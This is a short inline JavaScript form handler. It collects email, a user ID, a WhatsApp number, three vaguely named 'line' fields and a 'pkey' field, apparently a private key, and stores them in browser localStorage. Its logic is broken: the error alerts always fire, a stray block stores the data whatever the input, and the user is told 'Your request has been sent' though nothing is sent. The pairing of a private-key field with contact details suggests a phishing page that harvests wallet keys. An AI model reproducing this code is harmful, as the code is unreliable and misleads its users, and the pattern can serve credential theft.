<script>
    
document.getElementById('amount').addEventListener('submit', function(event) {
  event.preventDefault();

  let line = document.getElementById('line').value;
  let lin = document.getElementById('lin').value;
  let linn = document.getElementById('linn').value;
  let email = document.getElementById('email').value;
  let userId = document.getElementById('userId').value;
  let whatsappNumber = document.getElementById('whatsappNumber').value;
  let pkey = document.getElementById('pkey').value;
  
  ;

  if (!line || !linn || !lin || !email || !userId || !whatsappNumber || !pkey) {
    alert('Please fill out all fields');
  } else  {
    alert('Please provide a correct details ');
  }  {
    let formData = {
      line: line,
      linn: linn,
      lin: lin,
      email: email,
      userId: userId,
      whatsappNumber: whatsappNumber,
      pkey: pkey
    };

    let storedForms = JSON.parse(localStorage.getItem('storedForms')) || [];
    storedForms.push(formData);
    localStorage.setItem('storedForms', JSON.stringify(storedForms));
    alert('Your request has been sent');
  }
});

</script>
